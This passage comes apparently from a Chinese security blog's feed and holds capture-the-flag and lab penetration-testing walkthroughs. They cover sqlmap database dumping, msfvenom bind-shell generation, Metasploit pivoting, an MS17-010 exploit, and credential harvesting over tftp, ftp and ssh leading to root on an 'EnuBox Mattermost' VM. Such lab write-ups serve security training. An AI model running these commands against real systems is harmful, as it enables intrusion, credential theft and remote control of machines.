class="bash">到处所有表，所有字段内容</span></span><br><span class="line">sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch -D bagecms -tables --columns --dump</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch -D bagecms -T bage_admin --columns --dump</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">----+----------+----+---------------------+---------+-------------------+-------------------------------------------+----------+----------+-----------+-----------+-------------+-------------+----------------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> group_id <span class="operator">|</span> qq <span class="operator">|</span> email               <span class="operator">|</span> mobile  <span class="operator">|</span> notebook          <span class="operator">|</span> password                                  <span class="operator">|</span> realname <span class="operator">|</span> username <span class="operator">|</span> status_is <span class="operator">|</span> telephone <span class="operator">|</span> create_time <span class="operator">|</span> login_count <span class="operator">|</span> last_login_ip  <span class="operator">|</span> last_login_time <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----+---------------------+---------+-------------------+-------------------------------------------+----------+----------+-----------+-----------+-------------+-------------+----------------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>  <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span> <span class="number">0</span>  <span class="operator">|</span> bagecms<span class="variable">@bagecms</span>.com <span class="operator">|</span> <span class="operator">&lt;</span>blank<span class="operator">&gt;</span> <span class="operator">|</span> flag&#123;eS3sd1IKarw&#125; <span class="operator">|</span> <span class="number">46</span>f94c8de14fb36680850768ff1b7f2a (<span class="number">123</span>qwe) <span class="operator">|</span> <span class="operator">&lt;</span>blank<span class="operator">&gt;</span>  <span class="operator">|</span> admin    <span class="operator">|</span> Y         <span class="operator">|</span> <span class="operator">&lt;</span>blank<span class="operator">&gt;</span>   <span class="operator">|</span> <span class="number">1569240455</span>  <span class="operator">|</span> <span class="number">17</span>          <span class="operator">|</span> <span class="number">192.168</span><span class="number">.22</span><span class="number">.129</span> <span class="operator">|</span> <span class="number">1637839057</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----+---------------------+---------+-------------------+-------------------------------------------+----------+----------+-----------+-----------+-------------+-------------+----------------+-----------------+</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.128/index.php?r=special #后门shell</span><br></pre></td></tr></table></figure><h2 id="2-3上线msf"><a href="#2-3上线msf" class="headerlink" title="2.3上线msf"></a>2.3上线msf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.生成正向后门：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf</span><br><span class="line"> </span><br><span class="line">2.访问接受：</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.22.129</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br><span class="line"> </span><br><span class="line">3.信息收集及配置访问</span><br><span class="line">获取网络接口：run get_local_subnets</span><br><span class="line">查看路由地址：run autoroute -p</span><br><span class="line">添加路由地址：run autoroute -s 192.168.33.0/24</span><br></pre></td></tr></table></figure><h1 id="3-第三层"><a href="#3-第三层" class="headerlink" title="3.第三层"></a>3.第三层</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Target3:（windows7 x64）</span><br><span class="line">探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag-GG</span><br><span class="line">proxychains4 nmap -Pn -sT 192.168.33.33</span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.33.33</span><br><span class="line">exploit</span><br><span class="line">shell</span><br><span class="line">dir /S flag.txt /B</span><br><span class="line">type xxxxx.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-第一层&quot;&gt;&lt;a href=&quot;#1-第一层&quot; class=&quot;headerlink&quot; title=&quot;1.第一层&quot;&gt;&lt;/a&gt;1.第一层&lt;/h1&gt;&lt;h2 id=&quot;1-1扫描网段内主机&quot;&gt;&lt;a href=&quot;#1-1扫描网段内主机&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>01_EnuBox_Mattermost</title>
    <link href="http://example.com/2021/06/01/01_EnuBox_Mattermost/"/>
    <id>http://example.com/2021/06/01/01_EnuBox_Mattermost/</id>
    <published>2021-06-01T08:36:20.000Z</published>
    <updated>2022-01-13T09:01:58.475Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1 信息收集"></a>1 信息收集</h1><h2 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sn 192.168.43.0/24    </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-13 14:00 CST</span><br><span class="line">Nmap scan report for ubuntu (192.168.43.218)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 2.41 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sS -A 192.168.43.218</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-13 14:02 CST</span><br><span class="line">Nmap scan report for ubuntu (192.168.43.218)</span><br><span class="line">Host is up (0.00075s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">21/tcp   open  ftp           vsftpd 3.0.3</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.43.195</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 e9:8b:e3:46:0e:c1:7f:a2:1a:c3:df:9d:46:54:ad:1c (RSA)</span><br><span class="line">|   256 ff:5b:25:68:09:f5:45:2b:14:68:66:e0:ce:00:27:b3 (ECDSA)</span><br><span class="line">|_  256 bb:de:d2:db:03:b7:5c:cf:d7:3b:b7:21:65:21:5d:e3 (ED25519)</span><br><span class="line">80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Sorry, This Page Can&amp;#39;t Be Accessed</span><br><span class="line">3389/tcp open  ms-wbt-server xrdp</span><br><span class="line">MAC Address: 00:0C:29:E1:0F:23 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.75 ms ubuntu (192.168.43.218)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.20 seconds</span><br><span class="line">                                                                           </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p- 192.168.43.218            </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-13 14:43 CST</span><br><span class="line">Nmap scan report for ubuntu (192.168.43.218)</span><br><span class="line">Host is up (0.00056s latency).</span><br><span class="line">Not shown: 9994 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line">8065/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:E1:0F:23 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-3-网页浏览"><a href="#1-3-网页浏览" class="headerlink" title="1.3 网页浏览"></a>1.3 网页浏览</h2><h3 id="1-3-1-80端口"><a href="#1-3-1-80端口" class="headerlink" title="1.3.1 80端口"></a>1.3.1 80端口</h3><p><img src="01_EnuBox_Mattermost.assets/c2jmo5.png"><br>详细信息：OS“Ubuntu 16.04”服务器名“mattermost”。<br>README.md文件包含有关其他软件、计算机软件目录或归档文件中的文件的信息。</p><h3 id="1-3-2-8065端口"><a href="#1-3-2-8065端口" class="headerlink" title="1.3.2 8065端口"></a>1.3.2 8065端口</h3><p><img src="01_EnuBox_Mattermost.assets/0u7xkb.png"></p><h1 id="2-漏洞发现"><a href="#2-漏洞发现" class="headerlink" title="2 漏洞发现"></a>2 漏洞发现</h1><h2 id="2-1-tftp匿名登录"><a href="#2-1-tftp匿名登录" class="headerlink" title="2.1 tftp匿名登录"></a>2.1 tftp匿名登录</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ tftp 192.168.43.218                   </span><br><span class="line"><span class="meta">tftp&gt;</span><span class="bash"> get README.md</span></span><br><span class="line">Received 65 bytes in 0.0 seconds</span><br><span class="line"><span class="meta">tftp&gt;</span><span class="bash"> quit</span></span><br><span class="line">                                                                                                                                                         </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat README.md </span><br><span class="line">Hello Admin,</span><br><span class="line"></span><br><span class="line">Please use the following key: ComplexPassword0!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="01_EnuBox_Mattermost.assets/cp11zd.png"></p><h2 id="2-2-根据社区文字提示获取ftp凭据"><a href="#2-2-根据社区文字提示获取ftp凭据" class="headerlink" title="2.2 根据社区文字提示获取ftp凭据"></a>2.2 根据社区文字提示获取ftp凭据</h2><p><img src="01_EnuBox_Mattermost.assets/i8g3b0.png"></p><p><img src="01_EnuBox_Mattermost.assets/ba6iv1.png"><br><img src="01_EnuBox_Mattermost.assets/ny61tw.png"></p><h2 id="2-3-获取SSH凭据"><a href="#2-3-获取SSH凭据" class="headerlink" title="2.3 获取SSH凭据"></a>2.3 获取SSH凭据</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ftp 192.168.43.218</span><br><span class="line">Connected to 192.168.43.218.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.43.218:kali): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> dir</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp          8980 Jan 05  2020 examples.desktop</span><br><span class="line">drwxr-xr-x    3 ftp      ftp          4096 Jan 05  2020 users</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">cd</span> users</span></span><br><span class="line">250 Directory successfully changed.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> dir</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jan 05  2020 mattermost</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">cd</span> mattermost</span></span><br><span class="line">250 Directory successfully changed.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> dir</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp            11 Jan 05  2020 message</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get message</span></span><br><span class="line">local: message remote: message</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for message (11 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">11 bytes received in 0.01 secs (0.9226 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> quit</span></span><br><span class="line">221 Goodbye.</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat message  </span><br><span class="line">Welcome!!!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用mattermost    Welcome!!!尝试登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh mattermost@192.168.43.218                                                                                                                    130 ⨯</span><br><span class="line">The authenticity of host &#x27;192.168.43.218 (192.168.43.218)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:Gbd2O8gsuqCj8WM2BI2cenLrPTy373cbfqL6XcmvxuM.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.43.218&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">mattermost@192.168.43.218&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.0.0-37-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">0 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Your Hardware Enablement Stack (HWE) is supported until April 2023.</span><br><span class="line">Last login: Mon Jan  6 00:59:59 2020</span><br><span class="line">mattermost@ubuntu:~$ whoami</span><br><span class="line">mattermost</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="3-权限提升"><a href="#3-权限提升" class="headerlink" title="3 权限提升"></a>3 权限提升</h1><h2 id="3-1-收集信息"><a href="#3-1-收集信息" class="headerlink" title="3.1 收集信息"></a>3.1 收集信息</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mattermost@ubuntu:~$ ls</span><br><span class="line">Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos</span><br><span class="line">mattermost@ubuntu:~$ cd Desktop/</span><br><span class="line">mattermost@ubuntu:~/Desktop$ ls</span><br><span class="line">README.md  secret</span><br><span class="line">mattermost@ubuntu:~/Desktop$ cat README.md </span><br><span class="line">Hello User,</span><br><span class="line"></span><br><span class="line">Your secret key is 48912.</span><br><span class="line"></span><br><span class="line">Do not share this key with anyone.</span><br><span class="line"></span><br><span class="line">!! NOTE:: This key is not valid after 30 days and has been changed by our internal systems.</span><br><span class="line">!! NOTE:: Please contact the support desk to get new secret key.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mattermost@ubuntu:~/Desktop$ ./secret </span><br><span class="line">Hello Admin, Please enter the secret key:</span><br><span class="line">48912</span><br><span class="line">Your is either invalid or expired</span><br><span class="line">.mattermost@ubuntu:~/Desktop$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-2-下载文件"><a href="#3-2-下载文件" class="headerlink" title="3.2 下载文件"></a>3.2 下载文件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mattermost@ubuntu:~/Desktop$ php -S 0.0.0.0:8080</span><br><span class="line">PHP 7.2.24-0ubuntu0.18.04.1 Development Server started at Wed Jan 12 23:19:52 2022</span><br><span class="line">Listening on http://0.0.0.0:8080</span><br><span class="line">Document root is /home/mattermost/Desktop</span><br><span class="line">Press Ctrl-C to quit.</span><br><span class="line">[Wed Jan 12 23:21:06 2022] 192.168.43.195:40444 [200]: /secret</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ wget http://192.168.43.218:8080/secret                         --2022-01-13 15:21:05--  http://192.168.43.218:8080/secret正在连接 192.168.43.218:8080... 已连接。已发出 HTTP 请求，正在等待回应... 200 OK长度：8584 (8.4K) [application/octet-stream]正在保存至: “secret”secret                                 100%[===========================================================================&gt;]   8.38K  --.-KB/s  用时 0s      2022-01-13 15:21:05 (57.6 MB/s) - 已保存 “secret” [8584/8584])</span><br></pre></td></tr></table></figure><h2 id="3-3-反编译文件"><a href="#3-3-反编译文件" class="headerlink" title="3.3 反编译文件"></a>3.3 反编译文件</h2><p><img src="01_EnuBox_Mattermost.assets/gk3708.png"><br>如果输入的值与 0xf447 相等则变成系统权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ echo $((0xf447))</span><br><span class="line">62535</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mattermost@ubuntu:~/Desktop$ ./secret </span><br><span class="line">Hello Admin, Please enter the secret key:</span><br><span class="line">62535</span><br><span class="line">root@ubuntu:~/Desktop# whoami </span><br><span class="line">root</span><br><span class="line">root@ubuntu:~/Desktop# cat /root/Desktop/local.txt </span><br><span class="line">are2020nehoc0601Great!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">过程</span></span><br><span class="line">1.80端口获取提示信息查看README.md</span><br><span class="line">2.tftp匿名登录获取README.md</span><br><span class="line">3.README.md中获取8065端口网页账号密码</span><br><span class="line">4.根据8065端口网页社区留言获取ftp凭据</span><br><span class="line">5.通过ftp中的文件获取SSH凭据</span><br><span class="line">6.通过用户桌面文件信息得到secret文件</span><br><span class="line">7.通过反编译secret代码获取输入key与0xf447相等时获取到root权限</span><br><span class="line">8.运行secret输入与0xf447相等的十进制完成</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.端口扫描时须全部扫描避免漏掉一些不常用端口</span><br><span class="line">2.tftp匿名登录</span><br><span class="line">3.获取文件的一种方式：</span><br><span class="line">php -S 0.0.0.0:8080 # 当前文件夹</span><br><span class="line">wget http://192.168.43.218:8080/secret</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-信息收集&quot;&gt;&lt;a href=&quot;#1-信息收集&quot; class=&quot;headerlink&quot; title=&quot;1 信息收集&quot;&gt;&lt;/a&gt;1 信息收集&lt;/h1&gt;&lt;h2 id=&quot;1-1-主机发现&quot;&gt;&lt;a href=&quot;#1-1-主机发现&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>漏洞发现</title>
    <link href="http://example.com/2021/06/01/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"/>
    <id>http://example.com/2021/06/01/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/</id>
    <published>2021-06-01T08:36:20.000Z</published>
    <updated>2022-02-27T23:03:08.581Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-操作系统"><a href="#1-操作系统" class="headerlink" title="1.操作系统"></a>1.操作系统</h1><h2 id="1-1探针"><a href="#1-1探针" class="headerlink" title="1.1探针"></a>1.1探针</h2><h3 id="1-1-1Goby"><a href="#1-1-1Goby" class="headerlink" title="1.1.1Goby"></a>1.1.1Goby</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">goby下载：https://cn.gobies.org/</span><br><span class="line">goby的官方文档：https://cn.gobies.org/docs.html</span><br></pre></td></tr></table></figure><h3 id="1-1-2Nmap"><a href="#1-1-2Nmap" class="headerlink" title="1.1.2Nmap"></a>1.1.2Nmap</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># nmap 扩展漏洞扫描模块</span><br><span class="line">https://www.cnblogs.com/shwang/p/12623669.html</span><br></pre></td></tr></table></figure><h3 id="1-1-3Nessus"><a href="#1-1-3Nessus" class="headerlink" title="1.1.3Nessus"></a>1.1.3Nessus</h3><h3 id="1-1-4Nexpose"><a href="#1-1-4Nexpose" class="headerlink" title="1.1.4Nexpose"></a>1.1.4Nexpose</h3><h2 id="1-2类型"><a href="#1-2类型" class="headerlink" title="1.2类型"></a>1.2类型</h2><h2 id="1-3利用"><a href="#1-3利用" class="headerlink" title="1.3利用"></a>1.3利用</h2><h3 id="1-3-1Searchsploit"><a href="#1-3-1Searchsploit" class="headerlink" title="1.3.1Searchsploit"></a>1.3.1Searchsploit</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/offensive-security/exploitdb</span><br></pre></td></tr></table></figure><h3 id="1-3-2Metasploit"><a href="#1-3-2Metasploit" class="headerlink" title="1.3.2Metasploit"></a>1.3.2Metasploit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search 漏洞编号</span><br><span class="line">use 搜索到的漏洞编号</span><br><span class="line">show options 查看需要配置的信息</span><br><span class="line">set 配置所需要配置的信息</span><br><span class="line">exploit 开始攻击</span><br></pre></td></tr></table></figure><h2 id="1-4修复"><a href="#1-4修复" class="headerlink" title="1.4修复"></a>1.4修复</h2><h2 id="1-5补充"><a href="#1-5补充" class="headerlink" title="1.5补充"></a>1.5补充</h2><h1 id="2-WEB应用"><a href="#2-WEB应用" class="headerlink" title="2.WEB应用"></a>2.WEB应用</h1><h2 id="2-1已知CMS"><a href="#2-1已知CMS" class="headerlink" 